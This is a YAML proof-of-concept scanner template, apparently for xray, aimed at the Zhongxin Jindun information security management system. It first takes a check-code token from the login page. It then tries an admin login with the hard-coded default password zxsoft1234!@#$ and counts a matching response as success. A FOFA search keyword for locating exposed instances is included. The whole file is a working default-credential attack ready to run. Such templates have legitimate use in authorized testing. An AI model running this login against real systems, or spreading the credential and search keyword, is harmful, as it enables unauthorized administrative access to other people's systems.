name: poc-yaml-zhongxinjingdun-default-administrator-password
manual: true
transport: http
rules:
    r0:
        request:
            cache: true 
            method: GET
            path: /index.php?q=common/getcode
            headers:
                Referer: ""
        expression: response.status == 200 && "check_code=" in response.headers && "expires=" in response.headers && response.body.bcontains(b"quality")
        output:
            search: '"check_code=(?P<token>.+?)\\;".bsubmatch(response.body)'
            token: search["token"]
    r1:
        request:
            cache: true
            method: POST
            path: /index.php?q=common/login
            headers:
                Cookie: check_code={{token}}
            body: |
                name=admin&password=zxsoft1234!@#$&checkcode={{token}}&doLoginSubmit=1
        expression: response.status == 200 && response.body.bcontains(b"1")
expression: r0() && r1()
detail:
    author: cysec
    links:
        - http://cysec.com
    fofakeyword: title="中新金盾信息安全管理系统"